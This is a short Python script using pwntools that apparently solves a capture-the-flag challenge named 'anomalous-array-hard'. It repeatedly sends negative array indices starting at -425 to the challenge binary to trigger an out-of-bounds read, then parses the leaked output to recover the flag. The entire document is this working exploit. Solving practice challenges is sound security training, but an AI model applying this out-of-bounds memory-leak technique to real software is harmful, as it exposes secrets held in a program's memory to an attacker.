from pwn import *

array_start_offset = -425

for i in range(0, 8):
    p = process("/challenge/anomalous-array-hard")
    p.clean()
    p.sendline(str(array_start_offset + i).encode())
    x = p.clean()
    flag_leak = x.split(b'Your hacker number is ')[-1].split(b'\n')[0].strip()
    print(flag_leak)
    p.close()
